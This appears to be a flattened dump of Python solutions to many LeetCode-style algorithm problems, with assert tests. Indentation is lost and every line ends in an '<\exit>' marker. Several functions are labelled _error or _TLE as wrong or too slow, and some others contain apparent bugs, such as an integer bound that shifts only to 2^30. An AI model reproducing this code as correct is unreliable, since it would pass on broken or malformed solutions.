assert Solution().findMaxForm(["111", "1000", "1000", "1000"], 9, 3) == 3<\exit>
import bisect<\exit>
class Solution:<\exit>
def findRadius(self, houses, heaters):<\exit>
houses.sort()<\exit>
heaters.sort()<\exit>
r = 0<\exit>
i = 0<\exit>
for h in houses:<\exit>
i = bisect.bisect(heaters, h)<\exit>
left = max(0, i - 1)<\exit>
right = min(len(heaters) - 1, i)<\exit>
r_cur = min(abs(heaters[left] - h), abs(heaters[right] - h))<\exit>
r = max(r, r_cur)<\exit>
return r<\exit>
def findRadius_naive(self, houses, heaters):<\exit>
houses.sort()<\exit>
heaters.sort()<\exit>
heaters.append(float('inf'))<\exit>
r = 0<\exit>
i = 0<\exit>
for h in houses:<\exit>
while h > (heaters[i] + heaters[i+1]) / 2:<\exit>
i += 1<\exit>
r = max(r, abs(heaters[i] - h))<\exit>
return r<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findRadius([1,2,3,4], [1,4]) == 1<\exit>
class Solution:<\exit>
def findComplement(self, num):<\exit>
msb = 0<\exit>
while num >> msb:<\exit>
msb += 1<\exit>
mask = (1 << msb) - 1<\exit>
return mask & ~num<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findComplement(5) == 2<\exit>
class Solution:<\exit>
def totalHammingDistance(self, nums):<\exit>
ret = 0<\exit>
while any(nums):<\exit>
z, o = 0, 0<\exit>
for i in range(len(nums)):<\exit>
if nums[i] & 1 == 0:<\exit>
o += 1<\exit>
else:<\exit>
z += 1<\exit>
nums[i] >>= 1<\exit>
ret += z * o<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().totalHammingDistance([4, 14, 2]) == 6<\exit>
from typing import List<\exit>
import heapq<\exit>
class DualHeap:<\exit>
def __init__(self):<\exit>
self.max_h = []<\exit>
self.min_h = []<\exit>
self.max_sz = 0<\exit>
self.min_sz = 0<\exit>
self.to_remove = set()<\exit>
def insert(self, num):<\exit>
if self.max_h and num > self.max_h[0][1]:<\exit>
heapq.heappush(self.min_h, (num, num))<\exit>
self.min_sz += 1<\exit>
else:<\exit>
heapq.heappush(self.max_h, (-num, num))<\exit>
self.max_sz += 1<\exit>
self.balance()<\exit>
def pop(self, num):<\exit>
self.to_remove.add(num)<\exit>
if self.max_h and num > self.max_h[0][1]:<\exit>
self.min_sz -= 1<\exit>
else:<\exit>
self.max_sz -= 1<\exit>
self.balance()<\exit>
def clean_top(self):<\exit>
while self.max_h and self.max_h[0][1] in self.to_remove:<\exit>
_, num = heapq.heappop(self.max_h)<\exit>
self.to_remove.remove(num)<\exit>
while self.min_h and self.min_h[0][1] in self.to_remove:<\exit>
_, num = heapq.heappop(self.min_h)<\exit>
self.to_remove.remove(num)<\exit>
def balance(self):<\exit>
while self.max_sz < self.min_sz :<\exit>
self.clean_top()<\exit>
_, num =heapq.heappop(self.min_h)<\exit>
heapq.heappush(self.max_h, (-num, num))<\exit>
self.min_sz -= 1<\exit>
self.max_sz += 1<\exit>
while self.max_sz > self.min_sz + 1:<\exit>
self.clean_top()<\exit>
_, num = heapq.heappop(self.max_h)<\exit>
heapq.heappush(self.min_h, (num, num))<\exit>
self.min_sz += 1<\exit>
self.max_sz -= 1<\exit>
self.clean_top()<\exit>
def get_median(self, k):<\exit>
self.clean_top()<\exit>
if k % 2 == 1:<\exit>
return self.max_h[0][1]<\exit>
else:<\exit>
return 0.5 * (self.max_h[0][1] + self.min_h[0][1])<\exit>
class Solution:<\exit>
def medianSlidingWindow(self, nums: List[int], k: int) -> List[float]:<\exit>
ret = []<\exit>
dh = DualHeap()<\exit>
for i in range(k):<\exit>
dh.insert(nums[i])<\exit>
ret.append(dh.get_median(k))<\exit>
for i in range(k, len(nums)):<\exit>
dh.insert(nums[i])<\exit>
dh.pop(nums[i-k])<\exit>
ret.append(dh.get_median(k))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().medianSlidingWindow([-2147483648,-2147483648,2147483647,-2147483648,-2147483648,-2147483648,2147483647,2147483647,2147483647,2147483647,-2147483648,2147483647,-2147483648], 2)<\exit>
assert Solution().medianSlidingWindow([1,1,1,1], 2) == [1, 1, 1]<\exit>
assert Solution().medianSlidingWindow([1,3,-1,-3,5,3,6,7], 3) == [1,-1,-1,3,5,6]<\exit>
class Solution:<\exit>
def findMaxConsecutiveOnes(self, nums):<\exit>
s = 0<\exit>
e = 0<\exit>
ret = 0<\exit>
while s < len(nums):<\exit>
if nums[s] == 1:<\exit>
while e < len(nums) and nums[e] == 1:<\exit>
e += 1<\exit>
ret = max(ret, e - s)<\exit>
else:<\exit>
e += 1<\exit>
s = e<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMaxConsecutiveOnes([1,1,0,1,1,1]) == 3<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def PredictTheWinner(self, nums):<\exit>
l = len(nums)<\exit>
gross = [0]<\exit>
for e in nums:<\exit>
gross.append(gross[-1] + e)<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
for i in range(l-1, -1, -1):<\exit>
for j in range(i+1, l+1):<\exit>
F[i][j] = max(<\exit>
gross[j] - gross[i] - F[i+1][j],<\exit>
gross[j] - gross[i] - F[i][j-1]<\exit>
)<\exit>
return F[0][l] >= (gross[-1] - F[0][l])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().PredictTheWinner([1, 5, 2]) == False<\exit>
assert Solution().PredictTheWinner([1, 5, 233, 7]) == True<\exit>
class Solution:<\exit>
def findSubsequences(self, nums):<\exit>
subs = set()<\exit>
for n in nums:<\exit>
subs |= set([<\exit>
sub + (n,)<\exit>
for sub in subs<\exit>
if n >= sub[-1]<\exit>
])<\exit>
subs.add((n,))<\exit>
return [<\exit>
list(sub)<\exit>
for sub in subs<\exit>
if len(sub) >= 2<\exit>
]<\exit>
def findSubsequences(self, nums):<\exit>
l = len(nums)<\exit>
F = [<\exit>
[(nums[i],)]<\exit>
for i in range(l)<\exit>
]<\exit>
ret = set()<\exit>
for i in range(1, l):<\exit>
for j in range(i):<\exit>
if nums[i] >= nums[j]:<\exit>
for t in F[j]:<\exit>
cur = t + (nums[i],)<\exit>
ret.add(cur)<\exit>
F[i].append(cur)<\exit>
return list(map(list, ret))<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findTargetSumWays(self, A, S):<\exit>
if not A:<\exit>
return<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
F[0][0] = 1<\exit>
for i in range(len(A)):<\exit>
for k in F[i].keys():<\exit>
F[i+1][k-A[i]] += F[i][k]<\exit>
F[i+1][k+A[i]] += F[i][k]<\exit>
return F[len(A)][S]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findTargetSumWays([1, 1, 1, 1, 1], 3) == 5<\exit>
class Solution:<\exit>
def nextGreaterElement(self, nums1, nums2):<\exit>
h = {}<\exit>
stk = []<\exit>
for e in nums2[::-1]:<\exit>
while stk and stk[-1] <= e:<\exit>
stk.pop()<\exit>
h[e] = stk[-1] if stk else -1<\exit>
stk.append(e)<\exit>
return [<\exit>
h[q]<\exit>
for q in nums1<\exit>
]<\exit>
class Solution:<\exit>
def findDiagonalOrder(self, matrix):<\exit>
if not matrix:<\exit>
return []<\exit>
R, C = len(matrix), len(matrix[0])<\exit>
F = [[] for _ in range(R+C-1)]<\exit>
for r in range(R):<\exit>
for c in range(C):<\exit>
F[r+c].append(matrix[r][c])<\exit>
ret = []<\exit>
for i in range(R+C-1):<\exit>
if i % 2 == 1:<\exit>
ret.extend(F[i])<\exit>
else:<\exit>
ret.extend(F[i][::-1])<\exit>
return ret<\exit>
def findDiagonalOrder_2(self, matrix):<\exit>
if not matrix:<\exit>
return []<\exit>
i = 0<\exit>
j = 0<\exit>
inc = True<\exit>
ret = []<\exit>
R, C = len(matrix), len(matrix[0])<\exit>
while True:<\exit>
ret.append(matrix[i][j])<\exit>
if i == R - 1 and j == C - 1:<\exit>
break<\exit>
if inc:<\exit>
i -= 1<\exit>
j += 1<\exit>
if i < 0 or j >= C:<\exit>
inc = False<\exit>
if i < 0 and j < C:<\exit>
i = 0<\exit>
else:<\exit>
i += 2<\exit>
j = C - 1<\exit>
else:<\exit>
i += 1<\exit>
j -= 1<\exit>
if i >= R or j < 0:<\exit>
inc = True<\exit>
if j < 0 and i < R:<\exit>
j = 0<\exit>
else:<\exit>
i = R - 1<\exit>
j += 2<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findDiagonalOrder([<\exit>
[ 1, 2, 3 ],<\exit>
[ 4, 5, 6 ],<\exit>
[ 7, 8, 9 ]<\exit>
]) == [1,2,4,7,5,3,6,8,9]<\exit>
class Solution:<\exit>
def findWords(self, words):<\exit>
rows = [<\exit>
"qwertyuiop",<\exit>
"asdfghjkl",<\exit>
"zxcvbnm",<\exit>
]<\exit>
d = {<\exit>
e: i<\exit>
for i, v in enumerate(rows)<\exit>
for e in v<\exit>
}<\exit>
return [<\exit>
w<\exit>
for w in words<\exit>
if all(d[w[0].lower()] == d[l.lower()] for l in w)<\exit>
]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findWords(["Hello", "Alaska", "Dad", "Peace"]) == ["Alaska", "Dad"]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def findMode(self, root):<\exit>
ret = [[], 0]<\exit>
self.find_mode(root, [None, 0], ret, False)<\exit>
self.find_mode(root, [None, 0], ret, True)<\exit>
return ret[0]<\exit>
def find_mode(self, root, prev, ret, collect):<\exit>
if not root:<\exit>
return<\exit>
self.find_mode(root.left, prev, ret, collect)<\exit>
if prev[0] == root.val:<\exit>
prev[1] += 1<\exit>
else:<\exit>
prev[1] = 1<\exit>
prev[0] = root.val<\exit>
if not collect:<\exit>
ret[1] = max(ret[1], prev[1])<\exit>
else:<\exit>
if prev[1] == ret[1]:<\exit>
ret[0].append(root.val)<\exit>
self.find_mode(root.right, prev, ret, collect)<\exit>
def findMode_error(self, root):<\exit>
if not root:<\exit>
return []<\exit>
ret = [0, []]<\exit>
self.find_mode_error(root, root.val, ret)<\exit>
return ret[1]<\exit>
def find_mode_error(self, root, target, ret):<\exit>
cur = 0<\exit>
if not root:<\exit>
return cur<\exit>
if root.val == target:<\exit>
cur += 1<\exit>
cur += self.find_mode_error(root.left, root.val, ret)<\exit>
cur += self.find_mode_error(root.right, root.val, ret)<\exit>
if cur > ret[0]:<\exit>
ret[0], ret[1] = cur, [target]<\exit>
elif cur == ret[0]:<\exit>
ret[1].append(target)<\exit>
else:<\exit>
self.find_mode_error(root, root.val, ret)<\exit>
return cur<\exit>
from typing import List<\exit>
import heapq<\exit>
class Solution:<\exit>
def findMaximizedCapital(self, k: int, W: int, Profits: List[int], Capital: List[int]) -> int:<\exit>
capital_q = list(zip(Capital, Profits))<\exit>
profit_q = []<\exit>
heapq.heapify(capital_q)<\exit>
capital = W<\exit>
for _ in range(k):<\exit>
while capital_q and capital_q[0][0] <= capital:<\exit>
_, pro = heapq.heappop(capital_q)<\exit>
heapq.heappush(profit_q, (-pro, pro))<\exit>
if profit_q:<\exit>
_, pro = heapq.heappop(profit_q)<\exit>
capital += pro<\exit>
else:<\exit>
break<\exit>
return capital<\exit>
def findMaximizedCapital_TLE(self, k: int, W: int, Profits: List[int], Capital: List[int]) -> int:<\exit>
capital = W<\exit>
n = len(Profits)<\exit>
visited = [False for _ in range(n)]<\exit>
for _ in range(k):<\exit>
maxa = 0<\exit>
maxa_i = 0<\exit>
for i in range(n):<\exit>
if not visited[i] and Profits[i] >= maxa and Capital[i] <= capital:<\exit>
maxa = Profits[i]<\exit>
maxa_i = i<\exit>
if maxa > 0:<\exit>
capital += maxa<\exit>
visited[maxa_i] = True<\exit>
else:<\exit>
break<\exit>
return capital<\exit>
from bisect import bisect<\exit>
class Solution:<\exit>
def nextGreaterElements(self, nums):<\exit>
stk = []<\exit>
for n in nums[::-1]:<\exit>
while stk and stk[-1] <= n:<\exit>
stk.pop()<\exit>
stk.append(n)<\exit>
ret = []<\exit>
for n in nums[::-1]:<\exit>
while stk and stk[-1] <= n:<\exit>
stk.pop()<\exit>
ret.append(stk[-1] if stk else -1)<\exit>
stk.append(n)<\exit>
return ret[::-1]<\exit>
def nextGreaterElements_error(self, nums):<\exit>
A = nums + nums<\exit>
print(A)<\exit>
ret = []<\exit>
for e in nums:<\exit>
t = bisect(A, e)<\exit>
if t == len(A):<\exit>
ret.append(-1)<\exit>
else:<\exit>
ret.append(A[t])<\exit>
print(ret)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().nextGreaterElements([1,2,1]) == [2, -1, 2]<\exit>
class Solution:<\exit>
def convertToBase7(self, num):<\exit>
if num == 0:<\exit>
return "0"<\exit>
ret = []<\exit>
n = abs(num)<\exit>
while n:<\exit>
ret.append(n % 7)<\exit>
n //= 7<\exit>
ret = "".join(map(str, ret[::-1]))<\exit>
if num < 0:<\exit>
ret = "-" + ret<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().convertToBase7(100) == "202"<\exit>
assert Solution().convertToBase7(-7) == "-10"<\exit>
from typing import List<\exit>
import heapq<\exit>
dirs = [(0, -1), (0, 1), (-1, 0), (1, 0)]<\exit>
class Solution:<\exit>
def shortestDistance(self, maze: List[List[int]], start: List[int], destination: List[int]) -> int:<\exit>
m, n = len(maze), len(maze[0])<\exit>
D = [[float("inf") for _ in range(n)] for _ in range(m)]<\exit>
i, j = start<\exit>
D[i][j] = 0<\exit>
q = [(0, i, j)]<\exit>
while q:<\exit>
dist, i, j = heapq.heappop(q)<\exit>
for di, dj in dirs:<\exit>
cur_dist = 0<\exit>
I = i<\exit>
J = j<\exit>
while 0 <= I + di < m and 0 <= J + dj < n and maze[I + di][J + dj] == 0:<\exit>
I += di<\exit>
J += dj<\exit>
cur_dist += 1<\exit>
if dist + cur_dist < D[I][J]:<\exit>
D[I][J] = dist + cur_dist<\exit>
heapq.heappush(q, (D[I][J], I, J))<\exit>
i, j = destination<\exit>
return D[i][j] if D[i][j] != float("inf") else -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().shortestDistance([[0,0,1,0,0],[0,0,0,0,0],[0,0,0,1,0],[1,1,0,1,1],[0,0,0,0,0]], [0,4], [4,4]) == 12<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findFrequentTreeSum(self, root):<\exit>
counter = defaultdict(int)<\exit>
self.traverse(root, counter)<\exit>
ret = [[], 0]<\exit>
for k, v in counter.items():<\exit>
if v > ret[1]:<\exit>
ret[0] = [k]<\exit>
ret[1] = v<\exit>
elif v == ret[1]:<\exit>
ret[0].append(k)<\exit>
return ret[0]<\exit>
def traverse(self, root, counter):<\exit>
if not root:<\exit>
return 0<\exit>
cur = root.val<\exit>
cur += self.traverse(root.left, counter)<\exit>
cur += self.traverse(root.right, counter)<\exit>
counter[cur] += 1<\exit>
return cur<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def findBottomLeftValue(self, root):<\exit>
q = [root]<\exit>
while q:<\exit>
ret = q[0].val<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e.left:<\exit>
cur_q.append(e.left)<\exit>
if e.right:<\exit>
cur_q.append(e.right)<\exit>
q = cur_q<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def largestValues(self, root):<\exit>
ret = []<\exit>
if not root:<\exit>
return ret<\exit>
q = [root]<\exit>
while q:<\exit>
ret.append(max(map(lambda e: e.val, q)))<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e.left:<\exit>
cur_q.append(e.left)<\exit>
if e.right:<\exit>
cur_q.append(e.right)<\exit>
q = cur_q<\exit>
return ret<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def longestPalindromeSubseq(self, s):<\exit>
n = len(s)<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
for i in range(n):<\exit>
F[i][i] = 1<\exit>
for i in range(n-1, -1, -1):<\exit>
for j in range(i+1, n):<\exit>
F[i][j] = max(F[i+1][j], F[i][j-1])<\exit>
if s[i] == s[j]:<\exit>
F[i][j] = max(F[i][j], F[i+1][j-1] + 2)<\exit>
return F[0][n-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestPalindromeSubseq("bbbab") == 4<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def change(self, amount, coins):<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
n = len(coins)<\exit>
for l in range(n + 1):<\exit>
F[0][l] = 1<\exit>
for a in range(1, amount + 1):<\exit>
for l in range(1, n + 1):<\exit>
F[a][l] = F[a][l-1] + F[a - coins[l-1]][l]<\exit>
return F[amount][n]<\exit>
def change_TLE(self, amount, coins):<\exit>
if amount == 0:<\exit>
return 1<\exit>
coins.sort()<\exit>
n = len(coins)<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
for i in range(n):<\exit>
F[coins[i]][i] = 1<\exit>
for a in range(1, amount + 1):<\exit>
for i in range(n):<\exit>
for j in range(i + 1):<\exit>
F[a][i] += F[a - coins[i]][j]<\exit>
return sum(F[amount].values())<\exit>
def change_error(self, amount, coins):<\exit>
F = {0: 1}<\exit>
for a in range(1, amount + 1):<\exit>
F[a] = 0<\exit>
for c in coins:<\exit>
if a - c in F:<\exit>
F[a] += F[a - c]<\exit>
return F[amount]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().change(5, [1, 2, 5]) == 4<\exit>
class Solution:<\exit>
def detectCapitalUse(self, word: str) -> bool:<\exit>
if not word:<\exit>
return True<\exit>
head_upper = word[0].isupper()<\exit>
has_lower = False<\exit>
has_upper = False<\exit>
for w in word[1:]:<\exit>
if w.isupper():<\exit>
has_upper = True<\exit>
if has_lower or not head_upper:<\exit>
return False<\exit>
else:<\exit>
has_lower = True<\exit>
if has_upper:<\exit>
return False<\exit>
return True<\exit>
class Solution:<\exit>
def checkSubarraySum(self, nums, k):<\exit>
h = {0: 0}<\exit>
s = 0<\exit>
for l in range(1, len(nums) + 1):<\exit>
s += nums[l-1]<\exit>
if k != 0:<\exit>
s %= k<\exit>
if s in h:<\exit>
if l - h[s] >= 2:<\exit>
return True<\exit>
else:<\exit>
h[s] = l<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().checkSubarraySum([23,2,4,6,7], 6) == True<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findLongestWord(self, s, d):<\exit>
h = defaultdict(list)<\exit>
for d_idx, w in enumerate(d):<\exit>
w_idx = 0<\exit>
h[w[w_idx]].append((d_idx, w_idx))<\exit>
ret = ""<\exit>
for e in s:<\exit>
lst = h.pop(e, [])<\exit>
for d_idx, w_idx in lst:<\exit>
w = d[d_idx]<\exit>
w_idx += 1<\exit>
if w_idx >= len(w):<\exit>
ret = min(ret, w, key=lambda x: (-len(x), x))<\exit>
else:<\exit>
h[w[w_idx]].append((d_idx, w_idx))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findLongestWord("abpcplea", ["ale","apple","monkey","plea"]) == "apple"<\exit>
class Solution:<\exit>
def findMaxLength(self, nums):<\exit>
o = 0<\exit>
z = 0<\exit>
d = {0: 0}<\exit>
ret = 0<\exit>
for i, e in enumerate(nums):<\exit>
if e == 1:<\exit>
o += 1<\exit>
else:<\exit>
z += 1<\exit>
diff = o - z<\exit>
if diff in d:<\exit>
ret = max(ret, i + 1 - d[diff])<\exit>
else:<\exit>
d[diff] = i + 1<\exit>
return ret<\exit>
def findMaxLength_error(self, nums):<\exit>
n = len(nums)<\exit>
F = [0 for _ in range(n+1)]<\exit>
for i in range(n):<\exit>
F[i+1] = F[i]<\exit>
if nums[i] == 0:<\exit>
F[i+1] += 1<\exit>
i = 0<\exit>
j = n<\exit>
while i < j:<\exit>
count = F[j] - F[i]<\exit>
l = j - i<\exit>
if count * 2 == l:<\exit>
print(l)<\exit>
return l<\exit>
elif count * 2 < l:<\exit>
if nums[i] == 1:<\exit>
i += 1<\exit>
else:<\exit>
j -= 1<\exit>
else:<\exit>
if nums[i] == 0:<\exit>
i += 1<\exit>
else:<\exit>
j -= 1<\exit>
return 0<\exit>
def findMaxLength_TLE(self, nums):<\exit>
F = [0]<\exit>
n = len(nums)<\exit>
for e in nums:<\exit>
if e == 0:<\exit>
F.append(F[-1] + 1)<\exit>
else:<\exit>
F.append(F[-1])<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
for j in range(i+1, n+1):<\exit>
if (F[j] - F[i]) * 2 == j - i:<\exit>
ret = max(ret, j - i)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMaxLength([0, 1, 0]) == 2<\exit>
assert Solution().findMaxLength([0,1,0,1,1,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1,0,1,1,0,0,0,1,0,1,0,0,1,0,1,1,1,1,1,1,0,0,0,0,1,0,0,0,1,1,1,0,1,0,0,1,1,1,1,1,0,0,1,1,1,1,0,0,1,0,1,1,0,0,0,0,0,0,1,0,1,0,1,1,0,0,1,1,0,1,1,1,1,0,1,1,0,0,0,1,1]) == 68<\exit>
class Solution:<\exit>
def countArrangement(self, N: int) -> int:<\exit>
candidates = set(range(1, N+1))<\exit>
ret = self.dfs(candidates, 1, N)<\exit>
return ret<\exit>
def dfs(self, candidates, i, N):<\exit>
if i > N:<\exit>
return 1<\exit>
ret = 0<\exit>
for c in candidates:<\exit>
if c % i == 0 or i % c == 0:<\exit>
candidates.remove(c)<\exit>
ret += self.dfs(candidates, i+1, N)<\exit>
candidates.add(c)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countArrangement(2) == 2<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def wordsAbbreviation(self, words: List[str]) -> List[str]:<\exit>
hm = defaultdict(list)<\exit>
ret = [None for _ in words]<\exit>
for i, w in enumerate(words):<\exit>
hm[w[0], w[-1], len(w)].append(i)<\exit>
TrieNode = lambda: defaultdict(TrieNode)<\exit>
for lst in hm.values():<\exit>
root = TrieNode()<\exit>
for i in lst:<\exit>
w = words[i]<\exit>
cur = root<\exit>
for c in w:<\exit>
cur = cur[c]<\exit>
cur["count"] = cur.get("count", 0) + 1<\exit>
for i in lst:<\exit>
w = words[i]<\exit>
prefix_l = 0<\exit>
cur = root<\exit>
for c in w:<\exit>
prefix_l += 1<\exit>
cur = cur[c]<\exit>
if cur["count"] == 1:<\exit>
break<\exit>
ret[i] = self.abbrev(w, prefix_l)<\exit>
return ret<\exit>
def abbrev(self, w, prefix_l):<\exit>
abbrev_l = len(w) - 2 - prefix_l + 1<\exit>
if abbrev_l > 1:<\exit>
return w[:prefix_l] + str(abbrev_l) + w[-1]<\exit>
return w<\exit>
if __name__ == "__main__":<\exit>
assert Solution().wordsAbbreviation(["like", "god", "internal", "me", "internet", "interval", "intension", "face", "intrusion"]) == ["l2e","god","internal","me","i6t","interval","inte4n","f2e","intr4n"]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def getMinimumDifference(self, root: 'TreeNode') -> int:<\exit>
ret = [float('inf')]<\exit>
self.dfs(root, ret)<\exit>
return ret[0]<\exit>
def dfs(self, node, ret):<\exit>
if not node:<\exit>
return None, None<\exit>
left_min, left_max = self.dfs(node.left, ret)<\exit>
right_min, right_max = self.dfs(node.right, ret)<\exit>
if left_max:<\exit>
ret[0] = min(ret[0], abs(node.val - left_max))<\exit>
if right_min:<\exit>
ret[0] = min(ret[0], abs(node.val - right_min))<\exit>
left_min = left_min or node.val<\exit>
right_max = right_max or node.val<\exit>
return left_min, right_max<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def convertBST(self, root: 'TreeNode') -> 'TreeNode':<\exit>
self.walk(root, 0)<\exit>
return root<\exit>
def walk(self, node, cur_sum):<\exit>
if not node:<\exit>
return cur_sum<\exit>
s = self.walk(node.right, cur_sum)<\exit>
node.val += s<\exit>
return self.walk(node.left, node.val)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findMinDifference(self, timePoints: List[str]) -> int:<\exit>
ret = float("inf")<\exit>
A = list(sorted(map(self.minutes, timePoints)))<\exit>
n = len(A)<\exit>
for i in range(n - 1):<\exit>
ret = min(ret, self.diff(A[i+1], A[i]))<\exit>
ret = min(ret, self.diff(A[n-1], A[0]))<\exit>
return ret<\exit>
def diff(self, b, a):<\exit>
ret = b - a<\exit>
if ret > 12 * 60:<\exit>
ret = 24 * 60 - ret<\exit>
return ret<\exit>
def minutes(self, a):<\exit>
h, m = a.split(":")<\exit>
minutes = 60 * int(h) + int(m)<\exit>
return minutes<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMinDifference(["23:59","00:00"]) == 1<\exit>
from typing import List<\exit>
from bisect import bisect_right<\exit>
class Solution:<\exit>
def singleNonDuplicate(self, nums: List[int]) -> int:<\exit>
n = len(nums)<\exit>
lo, hi = 0, n<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
if (<\exit>
mid % 2 == 0 and mid + 1 < hi and nums[mid] == nums[mid + 1]<\exit>
) or (<\exit>
mid % 2 == 1 and mid - 1 >= lo and nums[mid] == nums[mid - 1]<\exit>
):<\exit>
lo = mid + 1<\exit>
else:<\exit>
hi = mid<\exit>
return nums[lo]<\exit>
def singleNonDuplicate_error(self, nums: List[int]) -> int:<\exit>
n = len(nums)<\exit>
lo, hi = 0, n<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
idx = bisect_right(nums, nums[mid], lo, hi)<\exit>
if idx <= mid:<\exit>
hi = mid - 1<\exit>
else:<\exit>
lo = mid<\exit>
return nums[hi - 1]<\exit>
def singleNonDuplicate_xor(self, nums: List[int]) -> int:<\exit>
ret = nums[0]<\exit>
for e in nums[1:]:<\exit>
ret ^= e<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def diameterOfBinaryTree(self, root: TreeNode) -> int:<\exit>
self.dfs(root)<\exit>
return self.ret<\exit>
def dfs(self, node):<\exit>
if not node:<\exit>
return 0<\exit>
l = self.dfs(node.left)<\exit>
r = self.dfs(node.right)<\exit>
self.ret = max(self.ret, l + 1 + r - 1)<\exit>
return max(l, r) + 1<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def leastBricks(self, wall: List[List[int]]) -> int:<\exit>
h = defaultdict(int)<\exit>
m = len(wall)<\exit>
for i in range(m):<\exit>
s = 0<\exit>
for j in range(len(wall[i]) - 1):<\exit>
s += wall[i][j]<\exit>
h[s] += 1<\exit>
return m - max(h.values() or [0])<\exit>
class Solution:<\exit>
def nextGreaterElement(self, n: int) -> int:<\exit>
seq = list(str(n))<\exit>
N = len(seq)<\exit>
if N < 2:<\exit>
return -1<\exit>
i = N - 2<\exit>
while seq[i] >= seq[i+1]:<\exit>
i -= 1<\exit>
if i < 0:<\exit>
return -1<\exit>
j = N - 1<\exit>
while seq[i] >= seq[j]:<\exit>
j -= 1<\exit>
seq[i], seq[j] = seq[j], seq[i]<\exit>
seq[i+1:] = reversed(seq[i+1:])<\exit>
ret = int("".join(seq))<\exit>
if ret <= 1 << 31 - 1:<\exit>
return ret<\exit>
else:<\exit>
return -1<\exit>
def nextGreaterElement_sort(self, n: int) -> int:<\exit>
seq = [int(e) for e in str(n)]<\exit>
stk = []<\exit>
for i in range(len(seq) - 1, -1 , -1):<\exit>
e = seq[i]<\exit>
popped = None<\exit>
while stk and seq[stk[-1]] > e:<\exit>
popped = stk.pop()<\exit>
if popped:<\exit>
seq[i], seq[popped] = seq[popped], seq[i]<\exit>
seq[i+1:] = sorted(seq[i+1:])<\exit>
ret = int("".join(map(str, seq)))<\exit>
if ret <= 1 << 31 - 1:<\exit>
return ret<\exit>
else:<\exit>
return -1<\exit>
stk.append(i)<\exit>
return -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().nextGreaterElement(12) == 21<\exit>
class Solution:<\exit>
def reverseWords(self, s: str) -> str:<\exit>
return " ".join(map(lambda x: x[::-1], s.split(" ")))<\exit>
class Node:<\exit>
def __init__(self, val, children):<\exit>
self.val = val<\exit>
self.children = children<\exit>
class Solution:<\exit>
def maxDepth(self, root: "Node") -> int:<\exit>
if not root:<\exit>
return 0<\exit>
max_child_depth = max([<\exit>
self.maxDepth(child)<\exit>
for child in root.children<\exit>
] or [0])<\exit>
return max_child_depth + 1<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def subarraySum(self, nums: List[int], k: int) -> int:<\exit>
h = defaultdict(int)<\exit>
ret = 0<\exit>
s = 0<\exit>
h[s] += 1<\exit>
for n in nums:<\exit>
s += n<\exit>
ret += h[s - k]<\exit>
h[s] += 1<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def arrayPairSum(self, nums: List[int]) -> int:<\exit>
nums.sort()<\exit>
return sum(nums[::2])<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
